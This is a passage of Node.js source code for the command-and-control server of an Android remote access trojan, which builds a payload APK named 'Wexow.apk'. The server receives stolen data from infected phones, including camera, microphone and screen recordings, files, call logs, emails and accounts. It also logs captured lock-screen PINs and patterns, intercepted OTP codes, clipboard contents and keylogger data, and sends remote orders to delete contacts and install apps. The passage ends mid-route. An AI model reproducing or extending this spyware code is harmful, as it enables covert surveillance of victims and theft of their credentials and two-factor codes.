const express = require("express");
const http = require("http");
const net = require("net");
const socketIo = require("socket.io");
const path = require("path");
const { exec } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const cookieParser = require("cookie-parser");

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// =====================================================
// ============ Authentication settings ========================
// =====================================================
const ACCESS_PASSWORD = process.env.ACCESS_PASSWORD || "change_me_1337";
const SESSION_SECRET =
  process.env.SESSION_SECRET || crypto.randomBytes(32).toString("hex");
const SESSION_DURATION = 24 * 60 * 60 * 1000;

function createSession() {
  const token = crypto.randomBytes(32).toString("hex");
  const signature = crypto
    .createHmac("sha256", SESSION_SECRET)
    .update(token)
    .digest("hex");
  return `${token}.${signature}`;
}

function verifySession(session) {
  if (!session) return false;
  const parts = session.split(".");
  if (parts.length !== 2) return false;
  const [token, signature] = parts;
  const expected = crypto
    .createHmac("sha256", SESSION_SECRET)
    .update(token)
    .digest("hex");
  try {
    return crypto.timingSafeEqual(
      Buffer.from(signature),
      Buffer.from(expected),
    );
  } catch (e) {
    return false;
  }
}

// =====================================================
// ============ Middleware =============================
// =====================================================
app.use(express.json({ limit: "100mb" }));
app.use(express.urlencoded({ limit: "100mb", extended: true }));
app.use(cookieParser());

// =====================================================
// ============ General variables =======================
// =====================================================
let clients = {};
let listeners = {};
let activeRecordings = {};
let activeScreenRecordings = {};
let transfers = {};
let dbExports = {};
let lastData = {};

const TRANSFERS_FILE = path.join(__dirname, "transfers.json");
try {
  if (fs.existsSync(TRANSFERS_FILE)) {
    transfers = JSON.parse(fs.readFileSync(TRANSFERS_FILE, "utf8"));
  }
} catch (e) {}

function saveTransfers() {
  try {
    fs.writeFileSync(TRANSFERS_FILE, JSON.stringify(transfers, null, 2));
  } catch (e) {}
}

let stats = {
  sent: { bytes: 0, packets: 0, lastBytes: 0, rate: 0 },
  recv: { bytes: 0, packets: 0, lastBytes: 0, rate: 0 },
};

["output", "Downloads"].forEach((dir) => {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir);
});

// =====================================================
// ============ Logger =================================
// =====================================================
function sysLog(msg, type = "info") {
  const time = new Date().toLocaleTimeString();
  const entry = { time, msg, type };
  io.emit("sys_log", entry);
  console.log(`[${time}] ${msg}`);
}

// =====================================================
// ============ Save functions =============================
// =====================================================
function saveMedia(clientId, type, base64Data, ext) {
  try {
    const buffer = Buffer.from(base64Data, "base64");
    const filename = `${Date.now()}.${ext}`;
    const filepath = path.join(
      __dirname,
      "Downloads",
      clientId,
      type,
      filename,
    );
    if (!fs.existsSync(path.dirname(filepath)))
      fs.mkdirSync(path.dirname(filepath), { recursive: true });
    fs.writeFileSync(filepath, buffer);
    return filename;
  } catch (e) {
    return null;
  }
}

function saveFile(clientId, fileName, base64Data) {
  try {
    const buffer = Buffer.from(base64Data, "base64");
    const filepath = path.join(
      __dirname,
      "Downloads",
      clientId,
      "files",
      fileName,
    );
    if (!fs.existsSync(path.dirname(filepath)))
      fs.mkdirSync(path.dirname(filepath), { recursive: true });
    fs.writeFileSync(filepath, buffer);
  } catch (e) {}
}

function saveLockData(clientId, data) {
  try {
    const filepath = path.join(
      __dirname,
      "Downloads",
      clientId,
      "lock_credentials.json",
    );
    let existing = [];
    if (fs.existsSync(filepath))
      existing = JSON.parse(fs.readFileSync(filepath));
    data.server_time = new Date().toLocaleString();
    existing.push(data);
    fs.writeFileSync(filepath, JSON.stringify(existing, null, 2));
  } catch (e) {}
}

function saveEmails(clientId, type, data) {
  try {
    const filepath = path.join(
      __dirname,
      "Downloads",
      clientId,
      "emails",
      `${type}.json`,
    );
    if (!fs.existsSync(path.dirname(filepath)))
      fs.mkdirSync(path.dirname(filepath), { recursive: true });
    fs.writeFileSync(
      filepath,
      JSON.stringify(
        {
          type,
          timestamp: new Date().toISOString(),
          count: data.length || 0,
          data,
        },
        null,
        2,
      ),
    );
    sysLog(
      `EMAILS_SAVED: ${type} (${data.length || 0} entries) from ${clientId}`,
      "ok",
    );
  } catch (e) {
    sysLog(`EMAILS_SAVE_ERROR: ${e.message}`, "err");
  }
}

function saveDBExport(clientId, data) {
  try {
    const filepath = path.join(
      __dirname,
      "Downloads",
      clientId,
      "db_export.json",
    );
    if (!fs.existsSync(path.dirname(filepath)))
      fs.mkdirSync(path.dirname(filepath), { recursive: true });
    fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
    dbExports[clientId] = {
      path: filepath,
      timestamp: Date.now(),
      url: `/Downloads/${clientId}/db_export.json`,
    };
    sysLog(`DB_EXPORT_SAVED: ${clientId}`, "ok");
  } catch (e) {
    sysLog(`DB_EXPORT_ERROR: ${e.message}`, "err");
  }
}

function storeLastData(clientId, type, data) {
  if (!lastData[clientId]) lastData[clientId] = {};
  lastData[clientId][type] = {
    timestamp: Date.now(),
    data: data,
  };
}

function unzipAsync(zipPath, destDir) {
  return new Promise((resolve, reject) => {
    if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
    exec(
      `unzip -o "${zipPath}" -d "${destDir}"`,
      { maxBuffer: 1024 * 1024 * 50 },
      (err, stdout, stderr) => {
        if (err) reject(err);
        else resolve(stdout);
      },
    );
  });
}

function makeWavHeader(dataLength, sampleRate) {
  const buf = Buffer.alloc(44);
  buf.write("RIFF", 0);
  buf.writeUInt32LE(36 + dataLength, 4);
  buf.write("WAVE", 8);
  buf.write("fmt ", 12);
  buf.writeUInt32LE(16, 16);
  buf.writeUInt16LE(1, 20);
  buf.writeUInt16LE(1, 22);
  buf.writeUInt32LE(sampleRate, 24);
  buf.writeUInt32LE(sampleRate * 2, 28);
  buf.writeUInt16LE(2, 32);
  buf.writeUInt16LE(16, 34);
  buf.write("data", 36);
  buf.writeUInt32LE(dataLength, 40);
  return buf;
}

function saveRecordingAsWav(clientId, rec) {
  try {
    const pcm = fs.readFileSync(rec.filepath);
    const wavPath = rec.filepath.replace(".pcm", ".wav");
    fs.writeFileSync(
      wavPath,
      Buffer.concat([makeWavHeader(pcm.length, rec.sampleRate), pcm]),
    );
    try {
      fs.unlinkSync(rec.filepath);
    } catch (e) {}
    io.emit("client_data", {
      id: clientId,
      data: {
        type: "mic_saved",
        file: `/Downloads/${clientId}/mic/recording_${rec.timestamp}.wav`,
      },
    });
    sysLog(
      `MIC_SAVED: recording_${rec.timestamp}.wav (${pcm.length} bytes)`,
      "ok",
    );
  } catch (e) {
    sysLog(`MIC_SAVE_ERROR: ${e.message}`, "err");
  }
}

function saveScreenRecordingChunk(clientId, json) {
  try {
    const rec = activeScreenRecordings[clientId];
    if (!rec) return false;
    rec.stream.write(Buffer.from(json.data, "base64"));
    rec.receivedChunks++;
    return true;
  } catch (e) {
    return false;
  }
}

function finishScreenRecording(clientId, name) {
  try {
    const rec = activeScreenRecordings[clientId];
    if (!rec) return;
    rec.stream.end(() => {
      const size = fs.existsSync(rec.filepath)
        ? fs.statSync(rec.filepath).size
        : 0;
      io.emit("client_data", {
        id: clientId,
        data: {
          type: "screen_recording_saved",
          name: name,
          size: size,
          url: `/Downloads/${clientId}/screen_recordings/${name}`,
        },
      });
      sysLog(`SCREEN_REC_SAVED: ${name} (${size} bytes)`, "ok");
      delete activeScreenRecordings[clientId];
    });
  } catch (e) {}
}

// =====================================================
// ============ Chunked Download =======================
// =====================================================
function handleDownloadStart(clientId, json) {
  const transferId = json.transferId;
  if (transfers[transferId] && transfers[transferId].zipPath) {
    const ws = clients[clientId] && clients[clientId].socket;
    if (ws) {
      ws.send(
        JSON.stringify({
          type: "file_download_resume",
          transferId,
          fromChunk: transfers[transferId].receivedChunks,
        }),
      );
    }
    return;
  }

  const dlDir = path.join(__dirname, "Downloads", clientId, "zips");
  if (!fs.existsSync(dlDir)) fs.mkdirSync(dlDir, { recursive: true });

  const zipPath = path.join(dlDir, json.name + ".part");
  const finalPath = path.join(dlDir, json.name);

  transfers[transferId] = {
    name: json.name,
    totalSize: json.totalSize,
    totalChunks: json.totalChunks,
    receivedChunks: 0,
    zipPath,
    finalPath,
    stream: fs.createWriteStream(zipPath, { flags: "w" }),
    clientId,
    startTime: Date.now(),
    status: "active",
    path: json.path || "/sdcard/DCIM/Screenshots",
  };
  saveTransfers();
  io.emit("client_data", {
    id: clientId,
    data: {
      type: "file_download_start",
      name: json.name,
      totalChunks: json.totalChunks,
    },
  });
}

function handleDownloadChunk(clientId, json) {
  const t = transfers[json.transferId];
  if (t && t.stream) {
    t.stream.write(Buffer.from(json.data, "base64"));
    t.receivedChunks++;
    t.lastChunkTime = Date.now();

    if (t.receivedChunks % 50 === 0) saveTransfers();

    if (t.receivedChunks % 20 === 0 || t.receivedChunks === t.totalChunks) {
      const progress = Math.round((t.receivedChunks / t.totalChunks) * 100);
      io.emit("client_data", {
        id: clientId,
        data: {
          type: "file_download_progress",
          name: t.name,
          progress,
          received: t.receivedChunks,
          total: t.totalChunks,
        },
      });
    }
  }
}

function handleDownloadEnd(clientId, json) {
  const t = transfers[json.transferId];
  if (t && t.stream) {
    t.stream.end(async () => {
      try {
        if (fs.existsSync(t.zipPath)) fs.renameSync(t.zipPath, t.finalPath);
        const fileSize = fs.statSync(t.finalPath).size;

        io.emit("client_data", {
          id: clientId,
          data: {
            type: "file_download_complete",
            name: t.name,
            size: fileSize,
            url: `/Downloads/${clientId}/zips/${t.name}`,
          },
        });

        try {
          await unzipAsync(
            t.finalPath,
            path.join(__dirname, "Downloads", clientId, "extracted"),
          );
          io.emit("client_data", {
            id: clientId,
            data: { type: "file_unzip_complete", name: t.name },
          });
        } catch (err) {}

        delete transfers[json.transferId];
        Object.keys(transfers).forEach((tid) => {
          if (transfers[tid].clientId === clientId) delete transfers[tid];
        });
        saveTransfers();

        setTimeout(() => {
          const ws = clients[clientId] && clients[clientId].socket;
          if (ws) {
            ws.send(
              JSON.stringify({
                type: "file_download_next",
                path: t.path,
              }),
            );
          }
        }, 5000);
      } catch (e) {}
    });
  }
}

// =====================================================
// ============ WebSocket Server =======================
// =====================================================
const WebSocket = require("ws");
const wss = new WebSocket.Server({
  noServer: true,
  maxPayload: 500 * 1024 * 1024,
  perMessageDeflate: false,
});

server.on("upgrade", (request, socket, head) => {
  const pathname = new URL(request.url, `http://${request.headers.host}`)
    .pathname;
  if (pathname === "/ws") {
    wss.handleUpgrade(request, socket, head, (ws) =>
      wss.emit("connection", ws, request),
    );
  } else {
    socket.destroy();
  }
});

wss.on("connection", (ws) => {
  let clientId = null;

  ws.isAlive = true;

  ws.on("pong", () => {
    ws.isAlive = true;
  });

  // Keep-alive
  const heartbeat = setInterval(() => {
    if (ws.isAlive === false) {
      console.log("[WS] Terminating dead client");
      clearInterval(heartbeat);
      return ws.terminate();
    }

    ws.isAlive = false;
    try {
      ws.ping();
    } catch (e) {}
  }, 15000);

  ws.on("message", (data) => {
    try {
      const json = JSON.parse(data.toString());

      if (json.type === "login") {
        clientId = `${json.man}_${json.model}`.replace(/\s+/g, "_");

        let country = "Unknown";
        const countryPath = path.join(
          __dirname,
          "Downloads",
          clientId,
          "country.txt",
        );
        if (fs.existsSync(countryPath))
          country = fs.readFileSync(countryPath, "utf8").trim();
        json.country = country;

        clients[clientId] = { socket: ws, details: json, isWs: true };
        io.emit("client_connected", { id: clientId, details: json });
        sysLog(`WS_CLIENT_CONNECTED: ${clientId}`, "ok");

        const deviceDir = path.join(__dirname, "Downloads", clientId);
        [
          "camera",
          "mic",
          "files",
          "zips",
          "extracted",
          "screen_recordings",
          "emails",
        ].forEach((sub) => {
          const d = path.join(deviceDir, sub);
          if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
        });

        const activeTransfers = Object.entries(transfers)
          .filter(([id, t]) => t.clientId === clientId && t.status === "active")
          .sort(([, a], [, b]) => b.startTime - a.startTime);

        if (activeTransfers.length > 0) {
          const [latestId, latest] = activeTransfers[0];
          setTimeout(() => {
            ws.send(
              JSON.stringify({
                type: "file_download_resume",
                transferId: latestId,
                fromChunk: latest.receivedChunks,
              }),
            );
          }, 3000);
        }
      } else if (clientId) {
        handleClientMessage(clientId, json, ws);
      }
    } catch (e) {
      sysLog(`WS parse error: ${e.message}`, "err");
    }
  });

  ws.on("close", () => {
    if (clientId) {
      if (activeRecordings[clientId]) {
        const rec = activeRecordings[clientId];
        rec.stream.end(() => saveRecordingAsWav(clientId, rec));
        delete activeRecordings[clientId];
      }
      if (activeScreenRecordings[clientId]) {
        activeScreenRecordings[clientId].stream.end();
        delete activeScreenRecordings[clientId];
      }
      delete clients[clientId];
      io.emit("client_disconnected", clientId);
      sysLog(`WS_CLIENT_DISCONNECTED: ${clientId}`, "err");
    }
  });
});

// =====================================================
// ============ Application Message Processor ====================
// =====================================================
function handleClientMessage(clientId, json, ws) {
  const type = json.type;
  storeLastData(clientId, type, json);
  io.emit("client_data", { id: clientId, data: json });

  switch (type) {
    // ========= Media =========
    case "camera":
      saveMedia(clientId, "camera", json.image, "jpg");
      break;

    case "mic":
      saveMedia(clientId, "mic", json.audio, "aac");
      break;

    case "mic_chunk":
      if (activeRecordings[clientId]) {
        activeRecordings[clientId].stream.write(
          Buffer.from(json.data, "base64"),
        );
      }
      break;

    case "live_screenshot":
      try {
        const buffer = Buffer.from(json.image, "base64");
        const filepath = path.join(
          __dirname,
          "Downloads",
          clientId,
          "live_screenshot.jpg",
        );

        if (!fs.existsSync(path.dirname(filepath))) {
          fs.mkdirSync(path.dirname(filepath), { recursive: true });
        }

        fs.writeFileSync(filepath, buffer);

        io.emit("client_data", {
          id: clientId,
          data: {
            type: "live_screenshot",
            image: json.image,
            width: json.width,
            height: json.height,
            time: json.time,
          },
        });

        if (!global.lastScreenshotLog) global.lastScreenshotLog = {};
        const now = Date.now();
        if (
          !global.lastScreenshotLog[clientId] ||
          now - global.lastScreenshotLog[clientId] > 30000
        ) {
          global.lastScreenshotLog[clientId] = now;
          sysLog(
            `LIVE_SCREENSHOT: ${clientId} (${json.width}x${json.height})`,
            "info",
          );
        }
      } catch (e) {
        sysLog(`LIVE_SCREENSHOT_ERROR: ${e.message}`, "err");
      }
      break;

    case "screen_share":
      // Live Stream — No Saving
      break;

    case "screen_recording_start":
      try {
        const recDir = path.join(
          __dirname,
          "Downloads",
          clientId,
          "screen_recordings",
        );
        if (!fs.existsSync(recDir)) fs.mkdirSync(recDir, { recursive: true });
        const filepath = path.join(
          recDir,
          json.name || `rec_${Date.now()}.mp4`,
        );
        activeScreenRecordings[clientId] = {
          filepath,
          stream: fs.createWriteStream(filepath),
          receivedChunks: 0,
          totalChunks: json.totalChunks || 0,
          startTime: Date.now(),
        };
        sysLog(`SCREEN_REC_START: ${json.name}`, "ok");
      } catch (e) {}
      break;

    case "screen_recording_chunk":
      saveScreenRecordingChunk(clientId, json);
      break;

    case "screen_recording_end":
      finishScreenRecording(clientId, json.name);
      break;

    // ========= Files =========
    case "file_download":
      if (json.data) saveFile(clientId, json.name, json.data);
      break;

    case "file_download_start":
      handleDownloadStart(clientId, json);
      break;
    case "file_download_chunk":
      handleDownloadChunk(clientId, json);
      break;
    case "file_download_end":
      handleDownloadEnd(clientId, json);
      break;

    case "file_delete":
      sysLog(
        `FILE_DELETE: ${json.path} → ${json.success ? "OK" : "FAIL"}`,
        json.success ? "ok" : "err",
      );
      break;
    case "file_rename":
      sysLog(
        `FILE_RENAME: ${json.path} → ${json.success ? "OK" : "FAIL"}`,
        json.success ? "ok" : "err",
      );
      break;
    case "file_mkdir":
      sysLog(
        `FILE_MKDIR: ${json.path} → ${json.success ? "OK" : "FAIL"}`,
        json.success ? "ok" : "err",
      );
      break;
    case "file_search":
      sysLog(`FILE_SEARCH: "${json.query}" → ${json.count}`, "ok");
      break;
    case "file_upload_result":
      sysLog(
        `FILE_UPLOAD: ${json.path} → ${json.success ? "OK" : "FAIL"}`,
        json.success ? "ok" : "err",
      );
      break;
    case "file_unzip_result":
      sysLog(
        `FILE_UNZIP: ${json.success ? "OK" : "FAIL"}`,
        json.success ? "ok" : "err",
      );
      break;

    // ========= Location =========
    case "location":
      if (json.country) {
        const countryPath = path.join(
          __dirname,
          "Downloads",
          clientId,
          "country.txt",
        );
        fs.writeFileSync(countryPath, json.country);
        if (clients[clientId]) clients[clientId].details.country = json.country;
      }
      break;

    case "lock_captured":
      saveLockData(clientId, json);
      sysLog(
        `LOCK_CAPTURED: PIN=${json.pin || ""} PATTERN=${json.pattern || ""}`,
        "ok",
      );
      break;

    // ========= Keylogger / OTP / Clipboard / Notif =========
    case "clipboard":
      sysLog(`CLIPBOARD: [${(json.content || "").substring(0, 60)}]`, "info");
      break;
    case "notification":
      sysLog(`NOTIF: ${json.app} → ${json.title}`, "info");
      break;
    case "otp":
      sysLog(`⭐ OTP_INTERCEPTED: ${json.otp} from ${json.sender}`, "ok");
      break;
    case "keylog":
    case "screen_reader":
    case "accessibility_status":
      sysLog(
        `ACCESSIBILITY: ${json.enabled ? "ENABLED" : "DISABLED"}`,
        json.enabled ? "ok" : "warn",
      );
      break;

    // ========= Emails =========
    case "contact_emails":
      saveEmails(clientId, "contact_emails", json.data || []);
      break;
    case "device_accounts":
      saveEmails(clientId, "accounts", json.data || []);
      break;
    case "sms_emails":
      saveEmails(clientId, "sms_emails", json.data || []);
      break;

    case "call_logs":
      // Save to file
      try {
        const callsDir = path.join(__dirname, "Downloads", clientId, "calls");
        if (!fs.existsSync(callsDir))
          fs.mkdirSync(callsDir, { recursive: true });

        const filepath = path.join(callsDir, "call_logs.json");
        fs.writeFileSync(
          filepath,
          JSON.stringify(
            {
              timestamp: new Date().toISOString(),
              count: json.count,
              stats: json.stats,
              data: json.data,
            },
            null,
            2,
          ),
        );

        io.emit("client_data", {
          id: clientId,
          data: json,
        });

        sysLog(`CALL_LOGS: ${json.count} entries from ${clientId}`, "ok");
      } catch (e) {
        sysLog(`CALL_LOGS_SAVE_ERROR: ${e.message}`, "err");
      }
      break;

    case "call_logs_cleared":
      sysLog(`CALL_LOGS_CLEARED: ${json.count} entries`, "ok");
      break;

    case "contact_deleted":
      sysLog(
        `CONTACT_DELETED: ${json.contactId} → ${json.success ? "OK" : "FAIL"}`,
        json.success ? "ok" : "err",
      );
      break;
    case "contacts_deleted_by_name":
      sysLog(
        `CONTACTS_DELETED: "${json.name}" → ${json.deleted}/${json.found}`,
        "ok",
      );
      break;
    case "contacts_deleted_multiple":
      sysLog(`CONTACTS_DELETED_BULK: ${json.deleted}/${json.total}`, "ok");
      break;
    case "all_contacts_deleted":
      sysLog(`ALL_CONTACTS_DELETED: ${json.count}`, "ok");
      break;

    // ========= Apps =========
    case "uninstallable_apps":
      sysLog(`LIST_APPS: ${json.count} apps from ${clientId}`, "ok");
      break;
    case "launchable_apps":
      sysLog(`LIST_LAUNCHABLE: ${json.count} apps from ${clientId}`, "ok");
      break;
    case "launch_result":
      sysLog(
        `LAUNCH: ${json.package} → ${json.success ? "OK" : "FAIL"}`,
        json.success ? "ok" : "err",
      );
      break;
    case "uninstall_result":
      sysLog(
        `UNINSTALL: ${json.package} → ${json.success ? "OK" : "FAIL"}`,
        json.success ? "ok" : "err",
      );
      break;
    case "install_result":
      sysLog(
        `INSTALL: ${json.package} → ${json.success ? "OK" : "FAIL"}`,
        json.success ? "ok" : "err",
      );
      break;
    case "install_started":
      sysLog(`INSTALL_STARTED: ${json.file} (${json.size} bytes)`, "ok");
      break;
    case "install_perm_status":
      sysLog(
        `INSTALL_PERM: ${json.can_install ? "GRANTED" : "DENIED"}`,
        json.can_install ? "ok" : "warn",
      );
      break;

    // ========= Power =========
    case "power_status":
      sysLog(
        `POWER_STATUS: admin=${json.is_admin} owner=${json.is_device_owner}`,
        "info",
      );
      break;
    case "power_action_result":
      sysLog(
        `POWER_${(json.action || "").toUpperCase()}: ${json.success ? "OK" : "FAIL"}`,
        json.success ? "ok" : "err",
      );
      break;

    // ========= DB =========
    case "db_export":
      saveDBExport(clientId, json.data || {});
      break;

    // ========= Device Admin =========
    case "device_admin_status":
      sysLog(
        `DEVICE_ADMIN: ${json.enabled ? "ENABLED" : "DISABLED"}`,
        json.enabled ? "ok" : "warn",
      );
      break;

    // ========= Auto Capture =========
    case "auto_capture":
      sysLog(`AUTO_CAPTURE: ${json.app} (${json.reason || ""})`, "info");
      break;
    case "ping":
      // ⭐ heartbeat
      try {
        const ws = clients[clientId]?.socket;
        if (ws && ws.readyState === 1) {
          ws.send(
            JSON.stringify({
              type: "pong",
              time: Date.now(),
              serverTime: new Date().toISOString(),
            }),
          );
        }
      } catch (e) {}
      break;

    case "pong":
      // Nothing
      break;
    default:
      console.dir({ id: clientId, data: json }, { depth: null });
      break;
  }
}

// =====================================================
// ============ TCP Server =============================
// =====================================================
function startTcpServer(port) {
  if (listeners[port]) return;

  const tcpServer = net.createServer((socket) => {
    let clientId = null;
    let buffer = "";

    socket.on("data", (data) => {
      stats.recv.bytes += data.length;
      stats.recv.packets += 1;

      buffer += data.toString();
      let boundary = buffer.indexOf("\n");

      while (boundary !== -1) {
        const msg = buffer.substring(0, boundary).trim();
        buffer = buffer.substring(boundary + 1);

        if (msg) {
          try {
            const json = JSON.parse(msg);

            if (json.type === "login") {
              clientId = `${json.model}_${socket.remoteAddress.replace(/:/g, "_")}`;
              let country = "Unknown";
              const countryPath = path.join(
                __dirname,
                "Downloads",
                clientId,
                "country.txt",
              );
              if (fs.existsSync(countryPath))
                country = fs.readFileSync(countryPath, "utf8").trim();
              json.country = country;

              clients[clientId] = { socket, details: json, isWs: false };
              io.emit("client_connected", { id: clientId, details: json });
              sysLog(`CLIENT_CONNECTED: ${clientId}`, "ok");

              const deviceDir = path.join(__dirname, "Downloads", clientId);
              [
                "camera",
                "mic",
                "files",
                "zips",
                "extracted",
                "screen_recordings",
                "emails",
              ].forEach((sub) => {
                const d = path.join(deviceDir, sub);
                if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
              });
            } else if (clientId) {
              handleClientMessage(clientId, json, socket);
            }
          } catch (e) {}
        }
        boundary = buffer.indexOf("\n");
      }
    });

    socket.on("close", () => {
      if (clientId) {
        delete clients[clientId];
        io.emit("client_disconnected", clientId);
        sysLog(`CLIENT_DISCONNECTED: ${clientId}`, "err");
      }
    });

    socket.on("error", () => {});
  });

  tcpServer.listen(port, "0.0.0.0", () => {
    listeners[port] = tcpServer;
    io.emit("listeners_update", Object.keys(listeners));
    sysLog(`LISTENER_STARTED: PORT ${port}`, "ok");
  });

  tcpServer.on("error", (err) => {
    io.emit("listener_error", { port, message: err.message });
    delete listeners[port];
    io.emit("listeners_update", Object.keys(listeners));
  });
}

function stopTcpServer(port) {
  if (listeners[port]) {
    listeners[port].close();
    delete listeners[port];
    io.emit("listeners_update", Object.keys(listeners));
  }
}

// =====================================================
// ============ Stats Loop =============================
// =====================================================
setInterval(() => {
  stats.sent.rate = stats.sent.bytes - stats.sent.lastBytes;
  stats.recv.rate = stats.recv.bytes - stats.recv.lastBytes;
  stats.sent.lastBytes = stats.sent.bytes;
  stats.recv.lastBytes = stats.recv.bytes;

  io.emit("stats_update", {
    stats,
    sysInfo: {
      cpu: (os.loadavg()[0] * 10).toFixed(1) + "%",
      ram: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + "%",
      uptime:
        Math.floor(os.uptime() / 3600) +
        "h " +
        Math.floor((os.uptime() % 3600) / 60) +
        "m",
      platform: os.platform() + " " + os.release(),
    },
  });
}, 2000);

// =====================================================
// ============ A unified function for sending a command to a device ============
// =====================================================
function sendOrderToClient(clientId, order, params = {}) {
  if (!clients[clientId]) return { success: false, error: "Client not found" };

  try {
    const payload = JSON.stringify({ order, ...params });
    if (clients[clientId].isWs) {
      clients[clientId].socket.send(payload);
    } else {
      clients[clientId].socket.write(payload + "\n");
    }
    stats.sent.bytes += payload.length;
    stats.sent.packets += 1;
    return { success: true };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

// =====================================================
// ============ Socket.IO (dashboard) ================
// =====================================================
io.on("connection", (socket) => {
  socket.emit(
    "initial_clients",
    Object.keys(clients).map((id) => ({
      id,
      details: clients[id].details,
    })),
  );
  socket.emit("listeners_update", Object.keys(listeners));
  socket.emit("db_exports", dbExports);

  socket.on("start_listener", (port) => startTcpServer(parseInt(port)));
  socket.on("stop_listener", (port) => stopTcpServer(parseInt(port)));

  // The Unified Order
  socket.on("order", (data) => {
    const { id, order, params } = data;

    if (!clients[id]) {
      console.log(`[ORDER ERROR] Client "${id}" not found`);
      return;
    }

    // mic
    if (order === "mic") {
      if (params.action === "start" && params.mode === "record") {
        const sampleRate = params.sample_rate || 11025;
        const timestamp = Date.now();
        const filename = `recording_${timestamp}.pcm`;
        const filepath = path.join(__dirname, "Downloads", id, "mic", filename);
        if (!fs.existsSync(path.dirname(filepath)))
          fs.mkdirSync(path.dirname(filepath), { recursive: true });
        activeRecordings[id] = {
          filepath,
          sampleRate,
          timestamp,
          stream: fs.createWriteStream(filepath),
        };
      } else if (params.action === "stop") {
        if (activeRecordings[id]) {
          const rec = activeRecordings[id];
          rec.stream.end(() => saveRecordingAsWav(id, rec));
          delete activeRecordings[id];
        }
      }
    }

    const result = sendOrderToClient(id, order, params);
    console.log(`[ORDER] ${order} → ${id} (${result.success ? "OK" : "FAIL"})`);
  });

  // REST API via Socket.IO — Using it from React
  socket.on("api_call", (data) => {
    const { requestId, clientId, command, params } = data;

    if (!clients[clientId]) {
      socket.emit("api_response", {
        requestId,
        success: false,
        error: "Client not found",
      });
      return;
    }

    const result = sendOrderToClient(clientId, command, params);
    socket.emit("api_response", {
      requestId,
      success: result.success,
      error: result.error || null,
    });
  });

  // ===== Build APK =====
  socket.on("build_apk", (config) => {
    exec(
      `node builder.js ${config.ip} ${config.port}`,
      { maxBuffer: 1024 * 1024 * 50 },
      (err, stdout, stderr) => {
        io.emit("build_log", stdout + stderr);
        if (!err) {
          io.emit("build_success", "Wexow.apk");
          sysLog(`BUILD_SUCCESS: Wexow.apk`, "ok");
        } else {
          io.emit("build_log", `\n❌ BUILD FAILED: ${err.message}\n`);
          io.emit("build_failed", err.message);
        }
      },
    );
  });

  socket.on("build_apk_advanced", (config) => {
    const configPath = path.join(__dirname, "build_config.json");
    fs.writeFileSync(configPath, JSON.stringify(config));

    const child = exec(
      `node builder.js --config build_config.json`,
      { maxBuffer: 1024 * 1024 * 50 },
      (err, stdout, stderr) => {
        if (err) {
          io.emit("build_log", `\n❌ BUILD FAILED: ${err.message}\n`);
          io.emit("build_failed", err.message);
        } else {
          io.emit("build_log", `\n✅ BUILD SUCCESS\n`);
          io.emit("build_success", "Wexow.apk");
        }
      },
    );

    child.stdout.on("data", (data) => io.emit("build_log", data.toString()));
    child.stderr.on("data", (data) => io.emit("build_log", data.toString()));
  });
});

// =====================================================
// ============ Authentication =========================
// =====================================================
app.get("/login", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "app", "index.html"));
});

app.post("/api/login", (req, res) => {
  const { password } = req.body;
  if (password === ACCESS_PASSWORD) {
    res.cookie("session", createSession(), {
      httpOnly: true,
      secure: false,
      sameSite: "lax",
      maxAge: SESSION_DURATION,
    });
    res.json({ success: true });
  } else {
    res.status(401).json({ success: false, error: "Invalid password" });
  }
});

app.get("/api/session", (req, res) => {
  res.json({ authenticated: verifySession(req.cookies.session) });
});

app.get("/api/logout", (req, res) => {
  res.clearCookie("session");
  res.json({ success: true });
});

// =====================================================
// =====================================================
// ============ ⭐⭐ REST API — All commands ⭐⭐ =========
// =====================================================
// =====================================================

const apiRouter = express.Router();

// Middleware - To verify the presence of the device
apiRouter.use("/:clientId/*", (req, res, next) => {
  const { clientId } = req.params;
  if (!clients[clientId]) {
    return res.status(404).json({ success: false, error: "Client not found" });
  }
  req.clientId = clientId;
  next();
});

// ============================================================
// ============== FILES =======================================
// ============================================================

// ⭐ Browse files
apiRouter.post("/:clientId/file_manager", (req, res) => {
  const { path: filePath } = req.body;
  const result = sendOrderToClient(req.clientId, "file_manager", {
    path: filePath,
  });
  res.json(result);
});

// ⭐ Upload file/folder
apiRouter.post("/:clientId/file_download", (req, res) => {
  const { path: filePath } = req.body;
  const result = sendOrderToClient(req.clientId, "file_download", {
    path: filePath,
  });
  res.json(result);
});

// ⭐ Request the next part
apiRouter.post("/:clientId/file_download_next", (req, res) => {
  const { path: filePath } = req.body;
  const result = sendOrderToClient(req.clientId, "file_download_next", {
    path: filePath,
  });
  res.json(result);
});

// ⭐ Upload file (Simple)
apiRouter.post("/:clientId/file_upload", (req, res) => {
  const { path: filePath, data } = req.body;
  const result = sendOrderToClient(req.clientId, "file_upload", {
    path: filePath,
    data,
  });
  res.json(result);
});

// ⭐ Upload split file — Start
apiRouter.post("/:clientId/file_upload_start", (req, res) => {
  const { path: filePath, totalChunks, totalSize } = req.body;
  const result = sendOrderToClient(req.clientId, "file_upload_start", {
    path: filePath,
    totalChunks,
    totalSize,
  });
  res.json(result);
});

// ⭐ Upload split file — part
apiRouter.post("/:clientId/file_upload_chunk", (req, res) => {
  const { chunkIndex, data } = req.body;
  const result = sendOrderToClient(req.clientId, "file_upload_chunk", {
    chunkIndex,
    data,
  });
  res.json(result);
});

// ⭐ Upload split file — End
apiRouter.post("/:clientId/file_upload_end", (req, res) => {
  const result = sendOrderToClient(req.clientId, "file_upload_end", {});
  res.json(result);
});

// ⭐ Extract ZIP files on the device
apiRouter.post("/:clientId/file_unzip", (req, res) => {
  const { zipPath, destDir } = req.body;
  const result = sendOrderToClient(req.clientId, "file_unzip", {
    zipPath,
    destDir,
  });
  res.json(result);
});

// ⭐ Delete file/folder
apiRouter.post("/:clientId/file_delete", (req, res) => {
  const { path: filePath } = req.body;
  const result = sendOrderToClient(req.clientId, "file_delete", {
    path: filePath,
  });
  res.json(result);
});

// ⭐ Rename
apiRouter.post("/:clientId/file_rename", (req, res) => {
  const { path: filePath, newName } = req.body;
